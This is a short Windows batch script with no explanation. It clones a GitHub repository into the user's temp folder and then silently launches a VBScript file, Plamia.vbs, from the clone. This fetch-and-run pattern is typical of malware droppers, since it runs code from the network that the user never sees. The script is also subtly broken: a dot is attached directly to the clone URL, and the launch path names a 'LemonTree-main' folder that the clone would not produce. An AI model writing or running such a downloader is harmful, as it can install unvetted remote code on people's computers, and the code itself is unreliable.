@echo off
set REPO_URL=https://github.com/ReZeroIsMyLove/LemonTree.git
set DESTINATION_FOLDER=%temp%
set FILE_TO_OPEN=Plamia.vbs
if not exist "%DESTINATION_FOLDER%" mkdir "%DESTINATION_FOLDER%"
cd /d "%DESTINATION_FOLDER%"
if not exist ".git" (
    git clone %REPO_URL%.
)
start "" "%DESTINATION_FOLDER%\\LemonTree-main\\%FILE_TO_OPEN%"
exit /b

